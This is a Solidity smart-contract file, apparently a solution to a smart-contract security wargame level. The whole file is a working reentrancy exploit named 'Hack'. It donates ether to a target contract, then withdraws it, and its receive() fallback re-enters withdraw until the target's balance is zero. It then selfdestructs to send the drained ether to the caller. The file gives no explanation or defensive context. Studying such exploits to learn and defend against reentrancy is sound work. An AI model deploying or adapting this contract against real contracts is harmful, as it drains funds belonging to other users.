// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IReentrancy {
    function donate(address) external payable;

    function withdraw(uint256) external;
}

contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function attack() external payable {
        uint256 fishAmount = msg.value;
        target.donate{value: fishAmount}(address(this));
        target.withdraw(fishAmount);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}
